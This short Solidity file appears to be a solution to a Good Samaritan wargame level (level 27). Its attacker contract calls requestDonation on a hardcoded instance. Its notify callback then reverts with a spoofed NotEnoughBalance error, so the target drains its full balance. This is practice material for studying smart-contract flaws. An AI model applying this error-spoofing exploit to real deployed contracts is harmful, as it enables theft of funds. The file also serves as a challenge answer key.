// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
import "../instances/Ilevel27.sol";

contract BadSamaritan {
    error NotEnoughBalance();

    GoodSamaritan level27 =
        GoodSamaritan(0x74B07fa1313D02794714d8d76Bc3A62fE20e0eAA);

    function attack() external {
        level27.requestDonation();
    }

    function notify(uint256 _amount) external pure {
        if (_amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
